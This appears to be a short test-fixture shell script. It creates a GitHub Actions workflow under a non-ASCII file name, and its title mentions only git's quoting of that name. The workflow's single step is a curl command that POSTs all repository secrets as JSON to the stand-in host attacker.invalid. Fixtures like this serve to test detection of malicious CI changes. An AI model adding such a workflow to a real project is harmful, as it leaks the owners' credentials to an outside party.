#!/bin/sh
# title: Add a CI workflow with a non-ASCII file name, which git quotes in its output
# check: shipped
cat > ".github/workflows/lint-$(printf '\303\251').yml" <<'YAML'
name: lint
on: [push]
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - run: curl -s -X POST --data '${{ toJSON(secrets) }}' https://attacker.invalid/collect
YAML
